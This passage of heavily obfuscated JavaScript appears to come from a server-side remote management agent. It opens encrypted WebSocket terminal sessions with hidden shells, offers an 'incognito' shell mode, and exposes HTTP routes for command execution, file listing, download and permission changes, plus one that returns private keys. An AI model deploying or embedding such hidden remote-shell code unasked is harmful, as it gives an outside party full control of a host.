        const f = this['hs']['Split']();
        this[fp(0x4f9)] = f[0x0], this[fp(0x33b)] = f[0x1], this[fp(0x4cc)] = !![];
        try {
            if (this['hs'])
                this['hs'][fp(0x546)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0aW(0x734)](a) {
        const fq = a0aW;
        if (!this[fq(0x4cc)])
            throw new Error(fq(0x514));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[fq(0x7e4)](this[fq(0x4f9)][fq(0x46b)](b, c));
    }
    [a0aW(0x527)](a) {
        const fr = a0aW, b = { 'rkyyi': fr(0x65e) };
        if (!this[fr(0x4cc)])
            throw new Error(b[fr(0x826)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[fr(0x7e4)](this[fr(0x33b)][fr(0x813)](c, d));
    }
    [a0aW(0x546)]() {
        const ft = a0aW, a = { 'tvyzu': ft(0x1cf) }, b = a['tvyzu']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[ft(0x4f9)] = null;
                continue;
            case '1':
                try {
                    if (this[ft(0x33b)])
                        this[ft(0x33b)][ft(0x546)]();
                } catch (d) {
                }
                continue;
            case '2':
                try {
                    if (this[ft(0x4f9)])
                        this[ft(0x4f9)][ft(0x546)]();
                } catch (f) {
                }
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[ft(0x33b)] = null;
                continue;
            case '5':
                try {
                    if (this['hs'])
                        this['hs'][ft(0x546)]();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0aR {
    constructor(a, b, c, d) {
        const fu = a0aW, f = { 'IckwG': fu(0x52a) }, g = f[fu(0x67d)]['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[fu(0x1f5)] = null;
                continue;
            case '1':
                this['proc'] = null;
                continue;
            case '2':
                this['args'] = d || [];
                continue;
            case '3':
                this[fu(0x44a)] = c;
                continue;
            case '4':
                this[fu(0x4e9)] = null;
                continue;
            case '5':
                this[fu(0x3ec)] = 0x0;
                continue;
            case '6':
                this['shell'] = a;
                continue;
            case '7':
                this[fu(0x29c)] = b;
                continue;
            }
            break;
        }
    }
    [a0aW(0x868)]() {
        const fv = a0aW, a = {
                'eUSWq': function (c, d) {
                    return c || d;
                },
                'CGJTP': fv(0x5db),
                'KObsb': fv(0x64d),
                'djCeC': fv(0x64c)
            };
        this[fv(0x213)] = a0s(this[fv(0x3c1)], this['args'], {
            'env': this[fv(0x29c)],
            'cwd': this['cwd'],
            'windowsHide': !![],
            'stdio': [
                a[fv(0x4c3)],
                a[fv(0x4c3)],
                a[fv(0x4c3)]
            ]
        }), this[fv(0x3ec)] = this[fv(0x213)][fv(0x3ec)] || 0x0;
        const b = this;
        this['proc']['stdout']['on'](a['KObsb'], c => b[fv(0x7e7)](c)), this[fv(0x213)]['stderr']['on'](fv(0x64d), c => b[fv(0x7e7)](c)), this['proc']['on'](a[fv(0x82a)], (c, d) => {
            const fw = fv;
            if (b[fw(0x4e9)])
                b[fw(0x4e9)]({
                    'exitCode': c,
                    'signal': a['eUSWq'](d, null)
                });
        });
    }
    ['_emitData'](a) {
        const fx = a0aW;
        if (this[fx(0x1f5)])
            this[fx(0x1f5)](a['toString'](fx(0x40f)));
    }
    ['onData'](a) {
        const fy = a0aW;
        return this[fy(0x1f5)] = a, {
            'dispose': () => {
                this['_onDataCb'] = null;
            }
        };
    }
    [a0aW(0x761)](a) {
        const fz = a0aW;
        return this[fz(0x4e9)] = a, {
            'dispose': () => {
                this['_onExitCb'] = null;
            }
        };
    }
    ['write'](a) {
        const fA = a0aW;
        if (!this[fA(0x213)] || !this[fA(0x213)]['stdin'])
            return;
        try {
            this[fA(0x213)][fA(0x69d)][fA(0x805)](a);
        } catch (b) {
        }
    }
    [a0aW(0x87f)]() {
    }
    [a0aW(0x7ac)]() {
        const fB = a0aW;
        try {
            if (this[fB(0x213)])
                this['proc'][fB(0x7ac)]();
        } catch (a) {
        }
    }
}
class a0aS {
    constructor() {
        const fC = a0aW, a = {
                'dvGhW': fC(0x67f),
                'THaRg': fC(0x86e)
            }, b = a[fC(0x2c6)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['CONTROL_PUBLIC_KEY'] = a0P[fC(0x831)]['control'][fC(0x777)];
                continue;
            case '1':
                this['useNoise'] = !![];
                continue;
            case '2':
                this[fC(0x85a)] = a0P['NOISE_KEYS_INTERNAL'][fC(0x638)][fC(0x34e)];
                continue;
            case '3':
                this[fC(0x375)] = null;
                continue;
            case '4':
                this[fC(0x60d)] = [];
                continue;
            case '5':
                this['phase'] = a[fC(0x57c)];
                continue;
            case '6':
                this['msgResolvers'] = [];
                continue;
            case '7':
                this[fC(0x786)] = null;
                continue;
            case '8':
                this[fC(0x2a4)] = new a0aQ(![], this[fC(0x85a)], this[fC(0x3b0)]);
                continue;
            case '9':
                this[fC(0x2a6)] = ![];
                continue;
            case '10':
                this[fC(0x647)] = ![];
                continue;
            case '11':
                this[fC(0x232)] = null;
                continue;
            }
            break;
        }
    }
    async [a0aW(0x259)]() {
        const fD = a0aW, a = {
                'SSuSa': function (b, c) {
                    return b === c;
                },
                'xGglO': fD(0x823)
            };
        this[fD(0x232)] && a0D['info']('[' + this['requestId'] + fD(0x7a8));
        if (this['ptyProcess']) {
            process[fD(0x36a)] === fD(0x534) && this[fD(0x786)][fD(0x3ec)] && this[fD(0x5ac)](this[fD(0x786)][fD(0x3ec)]);
            try {
                this[fD(0x786)]['kill']();
            } catch (b) {
            }
            this[fD(0x786)] = null;
        }
        if (this[fD(0x2a4)])
            this[fD(0x2a4)][fD(0x546)]();
        if (this['websocket'])
            try {
                a[fD(0x531)](this['websocket'][fD(0x7b1)], this['websocket'][fD(0x3dd)]) && this[fD(0x375)][fD(0x1e9)](0x3e8, a[fD(0x188)]);
            } catch (c) {
            } finally {
                this[fD(0x375)] = null;
            }
    }
    [a0aW(0x5ac)](a) {
        const fE = a0aW, b = {
                'FjGeW': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b['FjGeW'](a0r, fE(0x1fe) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aW(0x621)](a) {
        const fF = a0aW, b = {
                'nqLaS': function (c, d) {
                    return c === d;
                },
                'lKmxG': function (c, d) {
                    return c > d;
                },
                'eazMA': function (c, d) {
                    return c(d);
                },
                'XmLKU': fF(0x20a)
            };
        if (b[fF(0x7b6)](this[fF(0x66a)], fF(0x86e))) {
            if (b[fF(0x2f1)](this[fF(0x7a7)]['length'], 0x0)) {
                const c = this[fF(0x7a7)]['shift']();
                b[fF(0x2d6)](c, a);
            } else
                this[fF(0x60d)][fF(0x24a)](a);
        } else
            b[fF(0x7b6)](this[fF(0x66a)], b[fF(0x759)]) && this[fF(0x71f)](a);
    }
    async [a0aW(0x7dd)]() {
        const fG = a0aW, a = {
                'kHBYU': function (b, c) {
                    return b > c;
                }
            };
        if (a[fG(0x330)](this[fG(0x60d)][fG(0x650)], 0x0))
            return this[fG(0x60d)][fG(0x61f)]();
        return new Promise(b => {
            const fH = fG;
            this[fH(0x7a7)][fH(0x24a)](b);
        });
    }
    async [a0aW(0x4be)](a) {
        const fI = a0aW, b = {
                'DiGoY': function (c, d) {
                    return c(d);
                },
                'mLekg': function (c, d) {
                    return c > d;
                },
                'EYNRQ': function (c, d) {
                    return c(d);
                },
                'pmbMx': fI(0x5f3),
                'kxQZC': function (c, d) {
                    return c(d);
                }
            };
        b[fI(0x50e)](a, fI(0x6d1));
        try {
            await this[fI(0x2a4)][fI(0x432)]();
            const c = await this['_receiveWsBytes'](), d = this[fI(0x2a4)][fI(0x51a)](c);
            d && b[fI(0x394)](d[fI(0x650)], 0x0) && this[fI(0x375)][fI(0x595)](d);
            const f = await this[fI(0x7dd)]();
            this['cipher']['processHandshake'](f);
            if (!this['cipher']['handshakeFinished'])
                throw new Error('三次握手交互后仍未进入\x20Established\x20状态');
            b[fI(0x5be)](a, b['pmbMx']);
        } catch (g) {
            b[fI(0x40b)](a, fI(0x4f1) + g['message']);
            throw new Error(fI(0x839));
        }
    }
    [a0aW(0x23f)]() {
        const fJ = a0aW, a = {
                'pgaZp': fJ(0x534),
                'NtOin': fJ(0x79a),
                'hMKHu': fJ(0x613),
                'SiQwy': 'System32',
                'FuWJM': fJ(0x6f3),
                'oJmfu': fJ(0x7f6)
            };
        if (process[fJ(0x36a)] === a[fJ(0x656)]) {
            const d = process.env.SystemRoot || fJ(0x5cc), f = [
                    a0o['join'](d, fJ(0x2e9), a['NtOin'], a[fJ(0x5a0)], fJ(0x4d1)),
                    process.env.COMSPEC,
                    a0o[fJ(0x2f9)](d, a[fJ(0x2b0)], a[fJ(0x399)])
                ];
            for (const g of f) {
                if (g && a0l[fJ(0x5ec)](g))
                    return g;
            }
            return a[fJ(0x399)];
        }
        const b = [
            fJ(0x7ba),
            fJ(0x3af),
            fJ(0x1ee)
        ];
        for (const h of b) {
            if (a0l[fJ(0x5ec)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[fJ(0x5ec)](c))
            return c;
        return a[fJ(0x3f8)];
    }
    async ['startSession'](a, b, c, d = ![], f = ![]) {
        const fK = a0aW, g = {
                'autsU': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'BhiZQ': fK(0x208),
                'ZnViw': function (i, j) {
                    return i(j);
                }
            };
        this[fK(0x375)] = a, this['requestId'] = b, this[fK(0x647)] = d, this[fK(0x2a6)] = f;
        const h = i => a0D[fK(0x4dd)](fK(0x767) + b + ']\x20' + i);
        this[fK(0x2c1)] = !c, h(this[fK(0x2c1)] ? g[fK(0x55e)] : g[fK(0x385)]), a['on'](fK(0x7df), i => this[fK(0x621)](i));
        try {
            this[fK(0x2c1)] && await this['_doNoiseHandshake'](h), await this['_runTerminal'](h);
        } catch (i) {
            g[fK(0x64a)](h, fK(0x5f1) + i[fK(0x7df)]), await this[fK(0x259)]();
        }
    }
    async [a0aW(0x3a5)](a) {
        const fL = a0aW, b = {
                'ZqgQi': function (h, i) {
                    return h === i;
                },
                'FhEQz': function (h, i) {
                    return h(i);
                },
                'SHXGd': '🔌\x20客户端主动断开',
                'vPqLO': fL(0x5f0),
                'ZroZl': function (h, i) {
                    return h !== i;
                },
                'WeZNl': fL(0x2f4),
                'ATvuN': function (h, i) {
                    return h === i;
                },
                'booWS': fL(0x4d1),
                'JOKIN': fL(0x1c7),
                'LwSug': '-Command',
                'PIOLo': fL(0x802),
                'KdKbd': function (h) {
                    return h();
                },
                'siOBX': fL(0x2b9),
                'JUzEn': function (h, i) {
                    return h(i);
                },
                'rGcPB': function (h, i) {
                    return h(i);
                },
                'EkAMh': fL(0x20a),
                'EBNLj': function (h, i) {
                    return h > i;
                },
                'dObag': 'close'
            }, c = this[fL(0x23f)]();
        b[fL(0x3ee)](a, fL(0x6ef) + c);
        const d = Object[fL(0x1b8)]({}, process.env);
        delete d[fL(0x3d0)], d[fL(0x72f)] = fL(0x2b9);
        if (!d[fL(0x6ac)])
            d[fL(0x6ac)] = b[fL(0x453)];
        this['incognitoRequested'] && b['ZroZl'](process[fL(0x36a)], fL(0x534)) && (d[fL(0x304)] = b[fL(0x4a2)]);
        const f = this[fL(0x2a6)] && b[fL(0x24d)](process[fL(0x36a)], fL(0x534)) && b[fL(0x4fe)](a0o[fL(0x6c9)](c)[fL(0x40a)](), b[fL(0x795)]) ? [
                b['JOKIN'],
                b[fL(0x378)],
                b[fL(0x713)]
            ] : [], g = b[fL(0x5d1)](a0E);
        try {
            const h = {
                'name': b[fL(0x5af)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (process[fL(0x36a)] === fL(0x534))
                try {
                    this[fL(0x786)] = a0C['spawn'](c, f, h);
                } catch (i) {
                    b[fL(0x299)](a, '⚠️\x20ConPTY\x20启动失败，回退管道模式:\x20' + i[fL(0x7df)]), this['ptyProcess'] = new a0aR(c, d, g, f), this['ptyProcess'][fL(0x868)]();
                }
            else
                this[fL(0x786)] = a0C['spawn'](c, f, h);
            b['rGcPB'](a, fL(0x43c) + (this[fL(0x786)][fL(0x3ec)] || 'unknown') + ')');
            this[fL(0x647)] && this[fL(0x368)](c);
            this[fL(0x66a)] = b[fL(0x59f)];
            while (b[fL(0x7c1)](this['msgQueue'][fL(0x650)], 0x0)) {
                const j = this[fL(0x60d)]['shift']();
                this[fL(0x71f)](j);
            }
            this[fL(0x786)][fL(0x37e)](k => {
                const fM = fL;
                try {
                    let l = Buffer[fM(0x7e4)](k, fM(0x40f));
                    this[fM(0x2c1)] && this[fM(0x2a4)] && this[fM(0x2a4)]['handshakeFinished'] && (l = this[fM(0x2a4)]['encrypt'](l)), b[fM(0x24d)](this[fM(0x375)][fM(0x7b1)], 0x1) && this[fM(0x375)]['send'](l);
                } catch (m) {
                }
            }), this[fL(0x786)]['onExit'](({
                exitCode: k,
                signal: l
            }) => {
                const fN = fL;
                a(fN(0x65a) + k + fN(0x359) + l + ')'), this[fN(0x259)]();
            }), this[fL(0x375)]['on'](b['dObag'], () => {
                const fO = fL;
                b[fO(0x3ee)](a, b[fO(0x3b1)]), this[fO(0x259)]();
            });
        } catch (k) {
            a(fL(0x37f) + k[fL(0x7df)]), await this['cleanup']();
            throw k;
        }
    }
    static [a0aW(0x525)](a) {
        const fP = a0aW, b = {
                'wMASc': function (d, f) {
                    return d(f);
                },
                'gqnQS': function (d, f) {
                    return d || f;
                },
                'fYFhi': '.exe'
            };
        let c = a0o[fP(0x6c9)](b['wMASc'](String, b[fP(0x73c)](a, ''))['trim']())[fP(0x40a)]();
        if (c[fP(0x875)](b[fP(0x597)]))
            c = c[fP(0x500)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aW(0x4e3)](a) {
        const fQ = a0aW, b = {
                'CMHyv': function (c, d) {
                    return c === d;
                },
                'Txruj': 'win32',
                'hvDxy': function (c, d) {
                    return c(d);
                },
                'YHuVn': function (c, d) {
                    return c || d;
                },
                'PrJNh': function (c, d) {
                    return c === d;
                },
                'ZpqIa': fQ(0x4d1)
            };
        if (b['CMHyv'](process[fQ(0x36a)], b[fQ(0x752)])) {
            const c = a0o[fQ(0x6c9)](b[fQ(0x4cd)](String, b[fQ(0x82b)](a, '')))[fQ(0x40a)]();
            return b['PrJNh'](c, b[fQ(0x738)]) || c === fQ(0x6f3);
        }
        return !![];
    }
    [a0aW(0x368)](a) {
        const fR = a0aW, b = {
                'nQoei': 'welcome',
                'nImXY': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[fR(0x7e4)](JSON[fR(0x7ce)]({
                'type': b[fR(0x85f)],
                'shell': a0aS[fR(0x525)](a),
                'path': a,
                'incognito': !!(this['incognitoRequested'] && a0aS['incognitoNativeApplied'](a))
            }));
            this[fR(0x2c1)] && this[fR(0x2a4)] && this['cipher'][fR(0x4cc)] && (c = this[fR(0x2a4)][fR(0x734)](c)), this[fR(0x375)] && b[fR(0x67b)](this[fR(0x375)][fR(0x7b1)], 0x1) && this[fR(0x375)][fR(0x595)](c);
        } catch (d) {
        }
    }
    [a0aW(0x71f)](a) {
        const fS = a0aW, b = {
                'cqPCa': 'heartbeat',
                'aXmaN': fS(0x87f),
                'cYtwq': function (c, d) {
                    return c === d;
                },
                'RSIyV': fS(0x849),
                'FwrTU': fS(0x7f9),
                'iMssv': fS(0x40f)
            };
        if (!this[fS(0x786)])
            return;
        try {
            const c = Buffer[fS(0x7e4)](a);
            let d;
            this[fS(0x2c1)] ? d = this['cipher']['decrypt'](c) : d = c;
            let f = ![], g = d[fS(0x491)](fS(0x40f));
            if (g[fS(0x343)]()[fS(0x2eb)]('{'))
                try {
                    const h = JSON[fS(0x4d3)](g);
                    f = !![];
                    if (h[fS(0x55f)] === b['cqPCa']) {
                        let i = Buffer[fS(0x7e4)](JSON[fS(0x7ce)]({ 'type': b[fS(0x828)] }));
                        if (this[fS(0x2c1)])
                            i = this[fS(0x2a4)][fS(0x734)](i);
                        this[fS(0x375)][fS(0x595)](i);
                        return;
                    }
                    if (h['type'] === b['aXmaN']) {
                        this[fS(0x786)][fS(0x87f)](h[fS(0x34f)] || 0x50, h[fS(0x43f)] || 0x18);
                        return;
                    }
                    if (b[fS(0x77a)](h['type'], b[fS(0x787)]) && h[fS(0x64d)] !== undefined) {
                        let j = h[fS(0x322)] === b['FwrTU'] ? Buffer[fS(0x7e4)](h['data'], b[fS(0x4bf)])[fS(0x491)](b[fS(0x25b)]) : h['data'];
                        this[fS(0x786)][fS(0x805)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[fS(0x786)][fS(0x805)](d[fS(0x491)](fS(0x40f)));
        } catch (l) {
            a0D[fS(0x4dd)](fS(0x767) + this['requestId'] + fS(0x659) + l[fS(0x7df)]);
            if (this['useNoise'])
                this[fS(0x259)]();
        }
    }
}
async function a0aT(a = {}) {
    const fT = a0aW, b = {
            'jpilR': 'Access-Control-Allow-Origin',
            'UFITJ': fT(0x374),
            'GQbRO': fT(0x323),
            'ankIA': fT(0x646),
            'MDtfm': 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS',
            'uazcg': function (c, d) {
                return c === d;
            },
            'jarrB': 'OPTIONS',
            'pNgUK': fT(0x543),
            'cXkqQ': fT(0x4ed),
            'ltjVl': fT(0x74e),
            'vXKGq': function (c) {
                return c();
            },
            'GxhVh': fT(0x87e),
            'OzyRc': function (c, d) {
                return c / d;
            },
            'zsCai': function (c, d) {
                return c > d;
            },
            'mUOTN': function (c, d) {
                return c - d;
            },
            'EwRaZ': function (c, d) {
                return c === d;
            },
            'JLJxP': function (c, d) {
                return c === d;
            },
            'Qddbx': fT(0x5e7),
            'GyiNT': function (c, d) {
                return c !== d;
            },
            'PSNro': function (c, d, f) {
                return c(d, f);
            },
            'oBHQd': function (c, d) {
                return c > d;
            },
            'vtNBW': function (c, d) {
                return c - d;
            },
            'sfQTX': fT(0x495),
            'qJIxk': function (c, d) {
                return c === d;
            },
            'eLIMz': fT(0x739),
            'bgwgy': function (c, d) {
                return c === d;
            },
            'trZCc': fT(0x710),
            'nELRo': function (c, d) {
                return c(d);
            },
            'ficYP': 'x-file-name',
            'OQXvC': fT(0x426),
            'mRNWi': fT(0x86f),
            'fwTIa': function (c, d) {
                return c || d;
            },
            'XiJOJ': fT(0x2e5),
            'AJekH': function (c, d) {
                return c !== d;
            },
            'XkyuG': fT(0x352),
            'hOzmr': fT(0x419),
            'tsUvx': 'application/octet-stream',
            'oVSOW': fT(0x434),
            'sygoA': 'items\x20required\x20(non-empty\x20array)',
            'HKvtL': function (c, d, f) {
                return c(d, f);
            },
            'mXfVU': function (c, d) {
                return c(d);
            },
            'FGYDL': function (c, d) {
                return c < d;
            },
            'Dmhsn': function (c, d) {
                return c > d;
            },
            'iLKUi': fT(0x5d9),
            'PSvGa': function (c, d) {
                return c(d);
            },
            'omfKM': function (c, d) {
                return c === d;
            },
            'EIwdH': function (c, d) {
                return c < d;
            },
            'ixJgL': function (c, d) {
                return c > d;
            },
            'aiHhK': function (c, d) {
                return c ?? d;
            },
            'CzRQK': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'fKGKv': function (c, d) {
                return c === d;
            },
            'IlEbb': fT(0x407),
            'FvLyS': 'Missing\x20request_id',
            'xQHvX': fT(0x40f),
            'OMXTr': fT(0x65c),
            'Efgau': fT(0x417),
            'jGCpj': '@noble/curves/secp256k1.js',
            'godez': fT(0x1e3),
            'KKEyj': 'Validating\x20config...',
            'HOVjf': fT(0x50a),
            'DPFxA': fT(0x75b),
            'JHTPs': '❌\x20启动熔断:\x20ECDSA\x20公钥缺失或解析失败，非\x20DEBUG\x20模式下拒绝启动',
            'vRSNb': 'Initializing\x20TempKeyManager...',
            'xowye': fT(0x728),
            'bXvWs': fT(0x6a6),
            'iWprh': fT(0x65d),
            'ffFwM': fT(0x459),
            'nrFJg': function (c) {
                return c();
            },
            'hFpSg': function (c, d) {
                return c(d);
            },
            'WglBG': fT(0x741),
            'RNwEC': function (c, d, f) {
                return c(d, f);
            },
            'UScwi': fT(0x87a),
            'ORuQA': fT(0x778),
            'sRmsn': '/api/tempkey',
            'ssWDc': fT(0x4a5),
            'qdYxK': fT(0x7a9),
            'mPsRl': '/api/file/list',
            'JutaL': fT(0x69f),
            'GVaXH': '/api/fileraw',
            'rMLDx': '/api/file/download',
            'mLdoU': fT(0x1e1),
            'AkWUk': fT(0x52b),
            'ceszG': fT(0x19a),
            'dWGhT': fT(0x24c),
            'CPQln': fT(0x1e8),
            'fDhpr': fT(0x855),
            'WaQFm': '/api/task/log/summary',
            'lmagf': fT(0x4fa),
            'KkOmP': fT(0x194),
            'YEZgm': fT(0x30e),
            'GNzCh': fT(0x1b6),
            'mWoHL': fT(0x547),
            'pGWTt': fT(0x835),
            'afwNR': fT(0x251),
            'MTxYB': 'Fatal\x20error\x20in\x20main():'
        };
    try {
        const c = await import(b[fT(0x489)]);
        a0A = c[fT(0x1ab)];
        const d = await import(b[fT(0x298)]);
        a0B = d[fT(0x790)], a0D['debug'](b[fT(0x636)]), a0P[fT(0x438)](a), a0D['debug'](b[fT(0x3d8)]), a0P['validate'](), a0D[fT(0x768)](b[fT(0x520)]), a0D[fT(0x768)](fT(0x354));
        const f = new a0R(a0P['ECDSA_PUBLIC_KEY_PEM'], a0P[fT(0x2c8)]);
        a0D[fT(0x768)](b['DPFxA']);
        !a0P[fT(0x550)] && !f['ecdsaPubkey'] && (a0D[fT(0x5e7)](b['JHTPs']), a0D[fT(0x5e7)]('\x20\x20\x20请检查\x20ECDSA_PUBKEY\x20环境变量或\x20keys/agent_ecdsa_pub.pem\x20是否为合法\x20P-256\x20公钥\x20(PEM\x20或\x2033\x20字节压缩\x20Base64)'), process[fT(0x64c)](0x1));
        a0D['debug'](b[fT(0x311)]);
        const g = new a0Q();
        g[fT(0x51d)] = () => a0P['rotateOperationalSecrets'](), a0D['debug'](b[fT(0x50d)]), a0D[fT(0x768)](b[fT(0x600)]);
        const h = new a0U();
        a0D[fT(0x768)](b[fT(0x77c)]), a0D[fT(0x768)](b[fT(0x219)]);
        const i = b[fT(0x169)](a0f);
        b[fT(0x4de)](a0x, i), a0D[fT(0x768)](fT(0x17e)), i[fT(0x255)]((m, n, o) => {
            const fU = fT, p = '0|2|4|1|3|5'[fU(0x4c0)]('|');
            let q = 0x0;
            while (!![]) {
                switch (p[q++]) {
                case '0':
                    n[fU(0x2b1)](b[fU(0x555)], '*');
                    continue;
                case '1':
                    n[fU(0x2b1)](b[fU(0x54d)], b[fU(0x411)]);
                    continue;
                case '2':
                    n[fU(0x2b1)](b['ankIA'], b[fU(0x26a)]);
                    continue;
                case '3':
                    if (b['uazcg'](m[fU(0x717)], b[fU(0x15c)]))
                        return a0P[fU(0x550)] && n[fU(0x5ef)]('x-encrypted', b[fU(0x544)]), n[fU(0x7dc)](0xc8)[fU(0x342)]();
                    continue;
                case '4':
                    n[fU(0x2b1)](b[fU(0x408)], b[fU(0x2a3)]);
                    continue;
                case '5':
                    b['vXKGq'](o);
                    continue;
                }
                break;
            }
        }), i['use'](a0f[fT(0x5e5)]({
            'type': m => m[fT(0x2be)] !== fT(0x771),
            'limit': b['WglBG']
        })), i[fT(0x255)](a0f['urlencoded']({ 'extended': !![] })), i[fT(0x255)](b[fT(0x23e)](a0T, f, g)), a0D['debug'](b[fT(0x242)]), i['get'](b['ORuQA'], async (m, n) => {
            const fV = fT;
            try {
                const o = Math[fV(0x695)](b['OzyRc'](Date[fV(0x5d5)](), 0x3e8));
                !a0P['_baseinfo_cache'] || b[fV(0x422)](b['mUOTN'](o, a0P[fV(0x5a8)]), a0P[fV(0x744)]) ? (!a0P[fV(0x476)] && (a0P[fV(0x476)] = h[fV(0x5c6)]()[fV(0x66c)](q => {
                    const fW = fV, r = '0|4|3|2|1'[fW(0x4c0)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0P[fW(0x2a8)] = q;
                            continue;
                        case '1':
                            return q;
                        case '2':
                            a0D[fW(0x768)](b[fW(0x49d)]);
                            continue;
                        case '3':
                            a0P[fW(0x476)] = null;
                            continue;
                        case '4':
                            a0P[fW(0x5a8)] = Math['floor'](Date['now']() / 0x3e8);
                            continue;
                        }
                        break;
                    }
                })[fV(0x2fa)](q => {
                    const fX = fV;
                    a0P[fX(0x476)] = null;
                    throw q;
                })), await a0P[fV(0x476)]) : a0D[fV(0x768)](fV(0x3e7));
                const p = { ...a0P[fV(0x2a8)] };
                b['EwRaZ'](m[fV(0x325)], !![]) ? (p[fV(0x348)] = a0P[fV(0x18c)], p[fV(0x14f)] = a0P[fV(0x509)]) : (p[fV(0x348)] = null, p[fV(0x14f)] = null), n[fV(0x32b)](p), b[fV(0x60f)](a0P[fV(0x42a)], '1') && a0aM[fV(0x2f5)]();
            } catch (q) {
                n[fV(0x7dc)](0x1f4)['json']({
                    'status': b[fV(0x39f)],
                    'message': q[fV(0x7df)]
                });
            }
        }), i['get'](b[fT(0x819)], (m, n) => {
            const fY = fT;
            let o = a0P[fY(0x7ad)];
            if (b[fY(0x854)](m[fY(0x59b)]['ttl'], undefined)) {
                const r = b[fY(0x26b)](parseInt, m[fY(0x59b)]['ttl'], 0xa);
                if (Number[fY(0x6fc)](r) || r < 0x1 || r > a0P['TEMPKEY_MAX_TTL_HOURS'])
                    return n[fY(0x7dc)](0x1a6)[fY(0x32b)]({ 'error': fY(0x46e) + a0P['TEMPKEY_MAX_TTL_HOURS'] });
                o = r;
            }
            const p = g['getOrCreate'](o), q = s => new Date(s * 0x3e8)[fY(0x151)]()[fY(0x676)]('.000Z', 'Z');
            n[fY(0x32b)]({
                'status': 'ok',
                'key_id': p[fY(0x670)],
                'ttl_seconds': p[fY(0x272)],
                'created_at': q(p['created_at']),
                'expires_at': q(p['expires_at']),
                'ecdsa': {
                    'private_key': p[fY(0x39a)][fY(0x343)](),
                    'public_key': p[fY(0x533)]['trim']()
                },
                'ecies': {
                    'private_key': p[fY(0x34b)],
                    'public_key': p[fY(0x516)]
                }
            });
        }), i[fT(0x225)](b[fT(0x873)], async (m, n) => {
            const fZ = fT, o = { 'cKcSl': '2|0|1|4|3' };
            try {
                const p = Math[fZ(0x695)](b[fZ(0x607)](Date['now'](), 0x3e8));
                !a0P[fZ(0x577)] || b['oBHQd'](b[fZ(0x84b)](p, a0P[fZ(0x2b2)]), a0P[fZ(0x72d)]) ? (!a0P['_status_fetch_promise'] && (a0P[fZ(0x758)] = h[fZ(0x3c9)]()['then'](r => {
                    const g0 = fZ, s = o[g0(0x61e)][g0(0x4c0)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            a0P[g0(0x2b2)] = Math[g0(0x695)](Date[g0(0x5d5)]() / 0x3e8);
                            continue;
                        case '1':
                            a0P['_status_fetch_promise'] = null;
                            continue;
                        case '2':
                            a0P[g0(0x577)] = r;
                            continue;
                        case '3':
                            return r;
                        case '4':
                            a0D['debug'](g0(0x74d));
                            continue;
                        }
                        break;
                    }
                })[fZ(0x2fa)](r => {
                    const g1 = fZ;
                    a0P[g1(0x758)] = null;
                    throw r;
                })), await a0P[fZ(0x758)]) : a0D[fZ(0x768)](b[fZ(0x497)]);
                const q = { ...a0P[fZ(0x577)] };
                n[fZ(0x32b)](q);
            } catch (r) {
                n[fZ(0x7dc)](0x1f4)[fZ(0x32b)]({
                    'status': b[fZ(0x39f)],
                    'message': r[fZ(0x7df)]
                });
            }
        }), i['post'](b[fT(0x30a)], async (m, n) => {
            const g2 = fT;
            try {
                let o = null;
                if (b[g2(0x6f6)](typeof m[g2(0x41a)], g2(0x1fc)))
                    o = m[g2(0x41a)][g2(0x343)]();
                else
                    m['body'] && b[g2(0x403)](typeof m[g2(0x41a)], b[g2(0x645)]) && (o = m[g2(0x41a)][g2(0x576)] || '');
                if (!o)
                    return n[g2(0x7dc)](0x190)['json']({
                        'status': g2(0x5e7),
                        'message': g2(0x68d)
                    });
                const p = await a0V[g2(0x2d2)](o, {
                    'cwd': m[g2(0x41a)]['cwd'],
                    'env': m['body'][g2(0x29c)],
                    'timeout': a0P[g2(0x171)]
                });
                n[g2(0x32b)](p);
            } catch (q) {
                n[g2(0x7dc)](0x1f4)[g2(0x32b)]({
                    'status': b[g2(0x39f)],
                    'message': q['message']
                });
            }
        }), i[fT(0x155)](b['mPsRl'], async (m, n) => {
            const g3 = fT;
            try {
                const o = await a0Y[g3(0x6c2)](m[g3(0x41a)]['path'], m[g3(0x41a)][g3(0x7ff)]);
                n[g3(0x32b)]({
                    'status': 'ok',
                    'count': o['length'],
                    'files': o
                });
            } catch (p) {
                n[g3(0x7dc)](0x1f4)[g3(0x32b)]({
                    'status': b[g3(0x39f)],
                    'message': p[g3(0x7df)]
                });
            }
        }), i[fT(0x155)](fT(0x69f), async (m, n) => {
            const g4 = fT;
            try {
                const o = await a0Y['getFilePermissions'](m[g4(0x41a)][g4(0x83d)] || []);
                n[g4(0x32b)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[g4(0x7dc)](0x1f4)[g4(0x32b)]({
                    'status': b['Qddbx'],
                    'message': p[g4(0x7df)]
                });
            }
        }), i['put'](b[fT(0x1d1)], async (m, n) => {
            const g5 = fT;
            try {
                const o = m[g5(0x41a)][g5(0x718)] || {}, p = b[g5(0x451)](m[g5(0x41a)]['recursive'], !![]), q = await a0Y[g5(0x283)](o, p);
                n['json'](q);
            } catch (r) {
                n[g5(0x7dc)](0x1f4)[g5(0x32b)]({
